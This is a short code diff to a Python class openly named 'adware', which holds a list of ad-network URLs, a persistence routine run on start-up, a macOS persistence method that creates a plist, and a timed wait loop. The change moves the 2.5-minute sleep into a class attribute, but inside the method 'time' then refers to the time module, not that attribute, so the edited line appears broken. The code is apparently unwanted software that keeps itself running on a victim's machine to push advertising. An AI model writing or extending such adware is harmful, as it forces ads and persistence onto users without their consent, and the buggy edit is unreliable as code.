@@ -8,6 +8,7 @@ class adware:
     links = ["https://acceptable.a-ads.com/1610167",
              "https://caphaiks.com/4/4131263"]
     pyCall = "py"
+    time = 2.5 * 60
     i = 0;
     def __init__(self):
         self.persistence()
@@ -31,7 +32,7 @@ class adware:
 
     def wait(self):
         #2.5 minutes
-        time.sleep(2.5 * 60)
+        time.sleep(time)
 
     def persistenceMac(self):
         #make plist
